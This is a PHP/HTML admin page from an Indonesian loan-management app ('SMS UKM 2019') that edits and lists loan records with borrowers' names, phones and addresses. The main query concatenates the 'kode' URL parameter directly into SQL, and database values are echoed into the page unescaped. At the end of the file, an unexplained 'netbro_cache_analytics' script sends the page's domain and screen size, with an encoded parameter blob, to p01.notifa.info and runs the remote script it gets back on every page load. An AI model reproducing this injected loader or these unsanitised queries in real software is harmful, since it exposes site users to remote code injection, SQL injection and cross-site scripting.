<!DOCTYPE html>
<?php

error_reporting(0);
session_start();
include 'koneksi.php';



?>
<html lang="en">
<!-- Mirrored from html.codedthemes.com/guru-able/default/form-elements-component.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 22 Jan 2019 00:54:36 GMT -->
<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->

<head>
    <title>SMS UKM 2019 </title>
    <!-- HTML5 Shim and Respond.js IE10 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 10]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
    <!-- Meta -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="description" content="#">
    <meta name="keywords" content="Admin , Responsive, Landing, Bootstrap, App, Template, Mobile, iOS, Android, apple, creative app">
    <meta name="author" content="#">
    <!-- Favicon icon -->
    <link rel="icon" href="http://html.codedthemes.com/guru-able/files/assets/images/favicon.ico" type="image/x-icon">
    <!-- Google font-->
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,800" rel="stylesheet">
    <!-- Required Fremwork -->
    <link rel="stylesheet" type="text/css" href="../files/bower_components/bootstrap/css/bootstrap.min.css">
    <!-- themify-icons line icon -->
    <link rel="stylesheet" type="text/css" href="../files/assets/icon/themify-icons/themify-icons.css">
    <!-- ico font -->
    <link rel="stylesheet" type="text/css" href="../files/assets/icon/icofont/css/icofont.css">
    <!-- flag icon framework css -->
    <link rel="stylesheet" type="text/css" href="../files/assets/pages/flag-icon/flag-icon.min.css">

    <!-- Menu-Search css -->
    <link rel="stylesheet" type="text/css" href="../files/assets/pages/menu-search/css/component.css">
    <!-- Style.css -->
    <link rel="stylesheet" type="text/css" href="../files/assets/css/style.css">
    <!-- <link rel="stylesheet" type="text/css" href="../files/assets/css/jquery.mCustomScrollbar.css"> -->
    <!-- Data Table Css -->
    <link rel="stylesheet" type="text/css" href="../files/bower_components/datatables.net-bs4/css/dataTables.bootstrap4.min.css">
    <link rel="stylesheet" type="text/css" href="../files/assets/pages/data-table/css/buttons.dataTables.min.css">
    <link rel="stylesheet" type="text/css" href="../files/bower_components/datatables.net-responsive-bs4/css/responsive.bootstrap4.min.css">

    <!-- Modal -->
    <!-- <link rel="stylesheet" href="bootstrap/css/bootstrap.css"/> -->
    <link rel="stylesheet" href="datatables/dataTables.bootstrap.css" />

    <script type="text/javascript">
        function tampilkanwaktu() { //fungsi ini akan dipanggil di bodyOnLoad dieksekusi tiap 1000ms = 1detik    
            var waktu = new Date(); //membuat object date berdasarkan waktu saat 
            var sh = waktu.getHours() + ""; //memunculkan nilai jam, //tambahan script + "" supaya variable sh bertipe string sehingga bisa dihitung panjangnya : sh.length    //ambil nilai menit
            var sm = waktu.getMinutes() + ""; //memunculkan nilai detik    
            var ss = waktu.getSeconds() + ""; //memunculkan jam:menit:detik dengan menambahkan angka 0 jika angkanya cuma satu digit (0-9)
            document.getElementById("clock").innerHTML = (sh.length == 1 ? "0" + sh : sh) + ":" + (sm.length == 1 ? "0" + sm : sm) + ":" + (ss.length == 1 ? "0" + ss : ss);
        }
    </script>

</head>

<body onload="tampilkanwaktu();setInterval('tampilkanwaktu()', 1000);">
    <!-- Pre-loader start -->
    <div class="theme-loader">
        <div class="ball-scale">
            <div class='contain'>
                <div class="ring">
                    <div class="frame"></div>
                </div>
                <div class="ring">
                    <div class="frame"></div>
                </div>
                <div class="ring">
                    <div class="frame"></div>
                </div>
                <div class="ring">
                    <div class="frame"></div>
                </div>
                <div class="ring">
                    <div class="frame"></div>
                </div>
                <div class="ring">
                    <div class="frame"></div>
                </div>
                <div class="ring">
                    <div class="frame"></div>
                </div>
                <div class="ring">
                    <div class="frame"></div>
                </div>
                <div class="ring">
                    <div class="frame"></div>
                </div>
                <div class="ring">
                    <div class="frame"></div>
                </div>
            </div>
        </div>
    </div>
    <!-- Pre-loader end -->

    <div id="pcoded" class="pcoded">
        <div class="pcoded-overlay-box"></div>
        <div class="pcoded-container navbar-wrapper">

            <nav class="navbar header-navbar pcoded-header">
                <div class="navbar-wrapper">

                    <div class="navbar-logo">
                        <a href="#">

                            <h5> SMS UKM 2019</h5>
                        </a>
                        <a class="mobile-menu" id="mobile-collapse" href="#!">
                            <i class="ti-menu"></i>
                        </a>
                    </div>

                    <div class="navbar-container container-fluid">
                        <ul class="nav-left">
                            <li>
                                <div class="sidebar_toggle"><a href="javascript:void(0)"><i class="ti-menu"></i></a></div>
                            </li>
                        </ul>
                        <!-- search -->
                        <div id="morphsearch" class="morphsearch">
                            <form class="morphsearch-form">
                                <input class="morphsearch-input" type="search" placeholder="Search..." />
                                <button class="morphsearch-submit" type="submit">Search</button>
                            </form>
                            <div class="morphsearch-content">
                                <div class="dummy-column">
                                    <h2>People</h2>
                                    <a class="dummy-media-object" href="#!">
                                        <img src="../files/assets/images/avatar-1.jpg" alt="Sara Soueidan" />
                                        <h3>Sara Soueidan</h3>
                                    </a>
                                    <a class="dummy-media-object" href="#!">
                                        <img src="../files/assets/images/avatar-2.jpg" alt="Shaun Dona" />
                                        <h3>Shaun Dona</h3>
                                    </a>
                                </div>
                                <div class="dummy-column">
                                    <h2>Popular</h2>
                                    <a class="dummy-media-object" href="#!">
                                        <img src="../files/assets/images/avatar-3.jpg" alt="PagePreloadingEffect" />
                                        <h3>Page Preloading Effect</h3>
                                    </a>
                                    <a class="dummy-media-object" href="#!">
                                        <img src="../files/assets/images/avatar-4.jpg" alt="DraggableDualViewSlideshow" />
                                        <h3>Draggable Dual-View Slideshow</h3>
                                    </a>
                                </div>
                                <div class="dummy-column">
                                    <h2>Recent</h2>
                                    <a class="dummy-media-object" href="#!">
                                        <img src="../files/assets/images/avatar-5.jpg" alt="TooltipStylesInspiration" />
                                        <h3>Tooltip Styles Inspiration</h3>
                                    </a>
                                    <a class="dummy-media-object" href="#!">
                                        <img src="../files/assets/images/avatar-6.jpg" alt="NotificationStyles" />
                                        <h3>Notification Styles Inspiration</h3>
                                    </a>
                                </div>
                            </div>
                            <!-- /morphsearch-content -->
                            <span class="morphsearch-close"><i class="icofont icofont-search-alt-1"></i></span>
                        </div>
                        <!-- search end -->
                    </div>
                </div>
            </nav>

            <!-- Sidebar chat start -->
            <div id="sidebar" class="users p-chat-user showChat">
                <div class="had-container">
                    <div class="card card_main p-fixed users-main">
                        <div class="user-box">
                            <div class="card-block">
                                <div class="right-icon-control">
                                    <input type="text" class="form-control  search-text" placeholder="Search Friend" id="search-friends">
                                    <div class="form-icon">
                                        <i class="icofont icofont-search"></i>
                                    </div>
                                </div>
                            </div>
                            <div class="main-friend-list">
                                <div class="media userlist-box" data-id="1" data-status="online" data-username="Josephin Doe" data-toggle="tooltip" data-placement="left" title="Josephin Doe">
                                    <a class="media-left" href="#!">
                                        <img class="media-object" src="../files/assets/images/avatar-1.jpg" alt="Generic placeholder image">
                                        <div class="live-status bg-success"></div>
                                    </a>
                                    <div class="media-body">
                                        <div class="f-13 chat-header">Josephin Doe</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Sidebar inner chat start-->
            <div class="showChat_inner">
                <div class="media chat-inner-header">
                    <a class="back_chatBox">
                        <i class="icofont icofont-rounded-left"></i> Josephin Doe
                    </a>
                </div>
                <div class="media chat-messages">
                    <a class="media-left photo-table" href="#!">
                        <img class="media-object img-circle m-t-5" src="../files/assets/images/avatar-1.jpg" alt="Generic placeholder image">
                    </a>
                    <div class="media-body chat-menu-content">
                        <div class="">
                            <p class="chat-cont">I'm just looking around. Will you tell me something about yourself?</p>
                            <p class="chat-time">8:20 a.m.</p>
                        </div>
                    </div>
                </div>
                <div class="media chat-messages">
                    <div class="media-body chat-menu-reply">
                        <div class="">
                            <p class="chat-cont">I'm just looking around. Will you tell me something about yourself?</p>
                            <p class="chat-time">8:20 a.m.</p>
                        </div>
                    </div>
                    <div class="media-right photo-table">
                        <a href="#!">
                            <img class="media-object img-circle m-t-5" src="../files/assets/images/user.png" alt="Generic placeholder image">
                        </a>
                    </div>
                </div>
                <div class="chat-reply-box p-b-20">
                    <div class="right-icon-control">
                        <input type="text" class="form-control search-text" placeholder="Share Your Thoughts">
                        <div class="form-icon">
                            <i class="icofont icofont-paper-plane"></i>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Sidebar inner chat end-->
            <div class="pcoded-main-container">
                <div class="pcoded-wrapper">
                    <nav class="pcoded-navbar">
                        <div class="sidebar_toggle"><a href="#"><i class="icon-close icons"></i></a></div>
                        <div class="pcoded-inner-navbar main-menu">


                            <div class="pcoded-navigatio-lavel" data-i18n="nav.category.navigation">DASHBOARD</div>
                            <ul class="pcoded-item pcoded-left-item">
                                <li class=" ">
                                    <a href="dasboard.php">
                                        <span class="pcoded-micon"><i class="ti-cloud-up"></i><b>TII</b></span>
                                        <span class="pcoded-mtext" data-i18n="nav.animations.main">Upload Data Tagihan</span>
                                        <span class="pcoded-mcaret"></span>
                                    </a>
                                </li>

                                <li class=" ">
                                    <a href="input-tagihan.php">
                                        <span class="pcoded-micon"><i class="ti-cloud-up"></i><b>DC</b></span>
                                        <span class="pcoded-mtext" data-i18n="nav.animations.main">Input Data Pengajuan</span>
                                        <span class="pcoded-mcaret"></span>
                                    </a>
                                </li>
                                <li class=" ">
                                    <a href="laporan.php">
                                        <span class="pcoded-micon"><i class="ti-cloud-up"></i><b>TIO</b></span>
                                        <span class="pcoded-mtext" data-i18n="nav.animations.main">Laporan</span>
                                        <span class="pcoded-mcaret"></span>
                                    </a>
                                </li>

                            </ul>
                        </div>
                    </nav>
                    <div class="pcoded-content">
                        <div class="pcoded-inner-content">



                            <!-- Main-body start -->
                            <div class="main-body">
                                <div class="page-wrapper">
                                    <!-- Page-header start -->
                                    <div class="page-header card">
                                        <div class="row align-items-end">
                                            <div class="col-lg-8">
                                                <div class="page-header-title">
                                                    <i class="icofont icofont-file-code bg-c-blue"></i>
                                                    <div class="d-inline">
                                                        <div class="row form-group">
                                                            <div class="col col-sm-12">
                                                                <!-- Waktu dan tanggal -->

                                                                <span id="clock"></span>
                                                                <h4>
                                                                    <?php
                                                                    $hari = date('l');
                                                                    /*$new = date('l, F d, Y', strtotime($Today));*/
                                                                    if ($hari == "Sunday") {
                                                                        echo "Minggu";
                                                                    } elseif ($hari == "Monday") {
                                                                        echo "Senin";
                                                                    } elseif ($hari == "Tuesday") {
                                                                        echo "Selasa";
                                                                    } elseif ($hari == "Wednesday") {
                                                                        echo "Rabu";
                                                                    } elseif ($hari == "Thursday") {
                                                                        echo ("Kamis");
                                                                    } elseif ($hari == "Friday") {
                                                                        echo "Jum'at";
                                                                    } elseif ($hari == "Saturday") {
                                                                        echo "Sabtu";
                                                                    }
                                                                    ?>,
                                                                    <?php
                                                                    $tgl = date('d');
                                                                    echo $tgl;
                                                                    $bulan = date('F');
                                                                    if ($bulan == "January") {
                                                                        echo " Januari ";
                                                                    } elseif ($bulan == "February") {
                                                                        echo " Februari ";
                                                                    } elseif ($bulan == "March") {
                                                                        echo " Maret ";
                                                                    } elseif ($bulan == "April") {
                                                                        echo " April ";
                                                                    } elseif ($bulan == "May") {
                                                                        echo " Mei ";
                                                                    } elseif ($bulan == "June") {
                                                                        echo " Juni ";
                                                                    } elseif ($bulan == "July") {
                                                                        echo " Juli ";
                                                                    } elseif ($bulan == "August") {
                                                                        echo " Agustus ";
                                                                    } elseif ($bulan == "September") {
                                                                        echo " September ";
                                                                    } elseif ($bulan == "October") {
                                                                        echo " Oktober ";
                                                                    } elseif ($bulan == "November") {
                                                                        echo " November ";
                                                                    } elseif ($bulan == "December") {
                                                                        echo " Desember ";
                                                                    }
                                                                    $tahun = date('Y');
                                                                    echo $tahun;
                                                                    ?>
                                                            </div>
                                                        </div>
                                                        </h4>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <!-- Page-header end -->
                                    <?php
                                                                    $query = mysqli_query($connect, "select * from pinjaman where kode = '" . $_GET['kode'] . "';");
                                                                    $data = mysqli_fetch_array($query);
                                                                    ?>

                                    <!-- Page body start -->
                                    <div class="page-body">
                                        <div class="row">
                                            <div class="col-sm-12">
                                                <!-- Basic Form Inputs card start -->
                                                <div class="card">
                                                    <div class="card-block">
                                                        <h4 class="sub-title">UPDATE DATA PINJAMAN</h4>
                                                        <form method="POST" action="update-pinjaman.php">
                                                            <div class="form-group row">
                                                                <label for="example-text-input" class="col-sm-2 col-form-label">Kode</label>
                                                                <div class="col-sm-8">
                                                                    <input name="kode" id="kode" type="text" class="form-control form-control-center" placeholder="Kode" value="<?php echo $data['kode'] ?>" readonly>
                                                                </div>
                                                            </div>
                                                            <div class="form-group row">
                                                                <label for="example-text-input" class="col-sm-2 col-form-label">No. Antrian</label>
                                                                <div class="col-sm-8">
                                                                    <input name="no_antri" id="no_antri" type="text" class="form-control form-control-center" placeholder="No Antrian" value="<?php echo $data['no_antri'] ?>" readonly>
                                                                </div>
                                                            </div>
                                                            <div class="form-group row">
                                                                <label for="example-text-input" class="col-sm-2 col-form-label">Nama Lengkap</label>
                                                                <div class="col-sm-8">
                                                                    <input name="nama" id="nama" type="text" class="form-control form-control-center" placeholder="Nama Lengkap" value="<?php echo $data['nama']; ?>" />
                                                                </div>
                                                            </div>
                                                            <div class=" form-group row">
                                                                <label for="example-text-input" class="col-sm-2 col-form-label">Tanggal Pinjaman</label>
                                                                <div class="col-sm-8">
                                                                    <input name="tgl_pinjam" id="tgl_pinjam" class="form-control form-control-center" type="date" placeholder="Tanggal Pinjaman" value="<?php echo $data['tgl_pinjam']; ?>" />
                                                                </div>
                                                            </div>
                                                            <div class=" form-group row">
                                                                <label for="example-text-input" class="col-sm-2 col-form-label">Nominal</label>
                                                                <div class="col-sm-8">
                                                                    <input name="jumlah_pinjam" id="jumlah_pinjam" type="text" class="form-control form-control-center" placeholder="Nominal" value="<?php echo $data['jumlah_pinjam']; ?>" />
                                                                </div>
                                                            </div>
                                                            <div class=" form-group row">
                                                                <label for="example-text-input" class="col-sm-2 col-form-label">Nomer Telp</label>
                                                                <div class="col-sm-8">
                                                                    <input name="telp" id="telp" type="text" class="form-control form-control-center" placeholder="No Telp" value="<?php echo $data['telp']; ?>" />
                                                                </div>
                                                            </div>
                                                            <div class=" form-group row">
                                                                <label for="example-text-input" class="col-sm-2 col-form-label">Alamat</label>
                                                                <div class="col-sm-8">
                                                                    <input name="alamat" id="alamat" type="text" class="form-control form-control-center" placeholder="Alamat" value="<?php echo $data['alamat']; ?>" />
                                                                </div>
                                                            </div>
                                                            <div class=" form-group row">
                                                                <label for="example-text-input" class="col-sm-2 col-form-label">Status Pinjaman</label>
                                                                <div class="col-sm-8">
                                                                    <select class="form-control" id="status" name="status" value="<?php echo $data['status']; ?>">
                                                                        <option value="opt1">Status</option>
                                                                        <option>Lengkap</option>
                                                                        <option>Belum Lengkap</option>

                                                                    </select>
                                                                </div>
                                                            </div>
                                                            <div class="form-group row">
                                                                <label for="example-text-input" class="col-sm-2 col-form-label">Keterangan</label>
                                                                <div class="col-sm-8">
                                                                    <textarea rows="5" cols="5" name="ket_pinjam" id="ket_pinjam" type="text" class="form-control form-control-center" placeholder="Keterangan" value="<?php echo $data['ket_pinjam']; ?>"></textarea>
                                                                </div>
                                                            </div>

                                                            <button type="submit" class="btn btn-primary btn-sm" name="aksi" value="simpan">
                                                                <i class="fa fa-dot-circle-o"></i> SIMPAN UPDATE
                                                            </button>

                                                        </form>
                                                    </div>
                                                </div>
                                                <!-- Basic Form Inputs card end -->

                                                <div class="card">
                                                    <div class="card-header">
                                                        <h5>TAGIHAN BARU</h5>

                                                        <div class="card-header-right">
                                                            <i class="icofont icofont-spinner-alt-5"></i></div>

                                                    </div>

                                                    <div class="card-block">


                                                        <div class="dt-responsive table-responsive">
                                                            <table id="simpletable" class="table table-striped table-bordered nowrap">
                                                                <thead>
                                                                    <tr>
                                                                        <th>No Antrian</th>
                                                                        <th>Nama Lengkap</th>
                                                                        <th>Tanggal Pinjam</th>
                                                                        <th>Jumlah Pinjaman</th>
                                                                        <th>Telp</th>
                                                                        <th>Alamat</th>
                                                                        <th>Status</th>
                                                                        <th>Keterangan</th>

                                                                    </tr>
                                                                </thead>
                                                                <tbody>
                                                                    <?php
                                                                                                                                                                                                                        $tampil = "select * from pinjaman ";
                                                                                                                                                                                                                        $hasil = mysqli_query($connect, $tampil);
                                                                                                                                                                                                                        $no = 1;
                                                                                                                                                                                                                        while ($data = mysqli_fetch_array($hasil)) {
                                                                                                                                                                                                                            ?>
                                                                                                                                                                                                                            <tr>
                                                                                                                                                                                                                                <td scope="col">
                                                                                                                                                                                                                                    <center>
                                                                                                                                                                                                                                        <?php echo $data['no_antri']; ?>
                                                                                                                                                                                                                            </center>
                                                                                                                                                                                                                        </td>
                                                                                                                                                                                                                        <td scope="col">
                                                                                                                                                                                                                            <center>
                                                                                                                                                                                                                                <?php echo $data['nama']; ?>
                                                                                                                                                                                                                            </center>
                                                                                                                                                                                                                        </td>
                                                                                                                                                                                                                        <td scope="col">
                                                                                                                                                                                                                            <center>
                                                                                                                                                                                                                                <?php echo $data['tgl_pinjam']; ?>
                                                                                                                                                                                                                            </center>
                                                                                                                                                                                                                        </td>
                                                                                                                                                                                                                        <td scope="col">
                                                                                                                                                                                                                            <center>
                                                                                                                                                                                                                                <?php echo $data['jumlah_pinjam']; ?>
                                                                                                                                                                                                                            </center>
                                                                                                                                                                                                                        </td>
                                                                                                                                                                                                                        <td scope="col">
                                                                                                                                                                                                                            <center>
                                                                                                                                                                                                                                <?php echo $data['telp']; ?>
                                                                                                                                                                                                                            </center>
                                                                                                                                                                                                                        </td>
                                                                                                                                                                                                                        <td scope="col">
                                                                                                                                                                                                                            <center>
                                                                                                                                                                                                                                <?php echo $data['alamat']; ?>
                                                                                                                                                                                                                            </center>
                                                                                                                                                                                                                        </td>
                                                                                                                                                                                                                        <td scope="col">
                                                                                                                                                                                                                            <center>
                                                                                                                                                                                                                                <?php echo $data['status']; ?>
                                                                                                                                                                                                                            </center>
                                                                                                                                                                                                                        </td>
                                                                                                                                                                                                                        <td scope="col">
                                                                                                                                                                                                                            <center>
                                                                                                                                                                                                                                <?php echo $data['ket_pinjam']; ?>
                                                                                                                                                                                                                            </center>
                                                                                                                                                                                                                        </td>


                                                                                                                                                                                                                    </tr>
                                                                                                                                                                                                                    <?php $no++;
                                                                                                                                                                                                                        }
                                                                                                                                                                                                                        ?>
                                                                </tbody>
                                                                <tfoot>
                                                                    <tr>
                                                                        <th>No Antri</th>
                                                                        <th>Nama Lengkap</th>
                                                                        <th>Tanggal Pinjam</th>
                                                                        <th>Jumlah Pinjaman</th>
                                                                        <th>Telp</th>
                                                                        <th>Alamat</th>
                                                                        <th>Status</th>
                                                                        <th>Keterangan</th>


                                                                    </tr>
                                                                </tfoot>
                                                            </table>
                                                        </div>
                                                    </div>
                                                </div>
                                                <!-- Zero config.table end -->

                                            </div>
                                        </div>

                                    </div>
                                    <!-- Page body end -->
                                </div>

                            </div>
                            <!-- Main-body end -->
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>


    <!-- Warning Section Starts -->
    <!-- Older IE warning message -->
    <!--[if lt IE 10]>

<![endif]-->
    <!-- Warning Section Ends -->
    <!-- Required Jquery -->
    <script type="text/javascript" src="../files/bower_components/jquery/js/jquery.min.js"></script>
    <script type="text/javascript" src="../files/bower_components/jquery-ui/js/jquery-ui.min.js"></script>
    <script type="text/javascript" src="../files/bower_components/popper.js/js/popper.min.js"></script>
    <script type="text/javascript" src="../files/bower_components/bootstrap/js/bootstrap.min.js"></script>
    <!-- jquery slimscroll js -->
    <script type="text/javascript" src="../files/bower_components/jquery-slimscroll/js/jquery.slimscroll.js"></script>
    <!-- modernizr js -->
    <script type="text/javascript" src="../files/bower_components/modernizr/js/modernizr.js"></script>
    <script type="text/javascript" src="../files/bower_components/modernizr/js/css-scrollbars.js"></script>
    <!-- data-table js -->
    <script src="../files/bower_components/datatables.net/js/jquery.dataTables.min.js"></script>
    <script src="../files/bower_components/datatables.net-buttons/js/dataTables.buttons.min.js"></script>
    <script src="../files/assets/pages/data-table/js/jszip.min.js"></script>
    <script src="../files/assets/pages/data-table/js/pdfmake.min.js"></script>
    <script src="../files/assets/pages/data-table/js/vfs_fonts.js"></script>
    <script src="../files/bower_components/datatables.net-buttons/js/buttons.print.min.js"></script>
    <script src="../files/bower_components/datatables.net-buttons/js/buttons.html5.min.js"></script>
    <script src="../files/bower_components/datatables.net-bs4/js/dataTables.bootstrap4.min.js"></script>
    <script src="../files/bower_components/datatables.net-responsive/js/dataTables.responsive.min.js"></script>
    <script src="../files/bower_components/datatables.net-responsive-bs4/js/responsive.bootstrap4.min.js"></script>

    <!-- i18next.min.js -->
    <script type="text/javascript" src="../files/bower_components/i18next/js/i18next.min.js"></script>
    <script type="text/javascript" src="../files/bower_components/i18next-xhr-backend/js/i18nextXHRBackend.min.js"></script>
    <script type="text/javascript" src="../files/bower_components/i18next-browser-languagedetector/js/i18nextBrowserLanguageDetector.min.js"></script>
    <script type="text/javascript" src="../files/bower_components/jquery-i18next/js/jquery-i18next.min.js"></script>
    <!-- Custom js -->

    <script src="../files/assets/pages/data-table/js/data-table-custom.js"></script>
    <script src="../files/assets/js/pcoded.min.js"></script>
    <script src="../files/assets/js/demo-12.js"></script>
    <script src="../files/assets/js/jquery.mCustomScrollbar.concat.min.js"></script>
    <script type="text/javascript" src="../files/assets/js/script.js"></script>
    <script src="jquery-1.11.0.js"></script>
    <script src="bootstrap.js"></script>


    <!-- 
   <script src="js/jquery-1.11.2.min.js"></script> -->
    <!-- <script src="bootstrap/js/bootstrap.js"></script> -->


    <script type="text/javascript">
        //            jika dipilih, nim akan masuk ke input dan modal di tutup
        $(document).on('click', '.pilih', function(e) {
            document.getElementById("kode").value = $(this).attr('data-kode');
            document.getElementById("nama_cus").value = $(this).attr('data-nm');
            document.getElementById("sales").value = $(this).attr('data-sa');
            $('#myModal').modal('hide');
        });



        //            tabel lookup mahasiswa
        $(function() {
            $("#lookup").dataTable();
        });

        function dummy() {
            var kode = document.getElementById("kode").value;
            alert('kode ' + kode + ' berhasil tersimpan');

            var nama_cus = document.getElementById("nama_cus").value;
            alert('nama_cus ' + nama_cus + ' berhasil tersimpan');
        }
    </script>


    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2uARwFH94Yb%2blRLQYFhihWdBsd60DOwjCxhsxmfvF7viUmIwZlmVjb8%2bEefwHzzWU%2fZOIZKolF5oDgWIpSNABvOuPKgnsyOr4Cjnkm2V%2fUtv8rw%2bEq2UVLu%2bzQ6ZNyTZbfddQxXlS4iY9wL79VwItFWq9paHhZhSaUR7OL0IO24wWXOnibs9LjO3RgRJwDNFbustJqo3Xjn1q4qTXUDSBWOsVDFc48lTYBXr7GTuB6sO%2fXZ1Qzf1mLrdJZkSpkxGaScGNArrVXI69HD9bwZNxAiO2bwBhpKYwb%2bCr0Dla5DEAD0t%2bfOG%2fRTxzqL1cBYZhri5POqbhc8Ir178C1njN0XgbUHtxSfeSUWyndx52JH3MpLRzdeTv7vPrqdW974HjAnmXwK5lqXBt5V1%2bKsFJUxsZSdtHnytIUKv9htyaRFlsla%2bo6HAjOhv1ciwJQI0s%2fZiiKbqAevjYQHE7RLeFYyYbj42acjZjma14IdpemAjn8BXNQYhPCT9hOxHXG1OtvY7It%2boSF6wjqzlVdstZHg%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };
    </script>
</body>



<!-- Mirrored from html.codedthemes.com/guru-able/default/form-elements-component.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 22 Jan 2019 00:54:47 GMT -->

</html>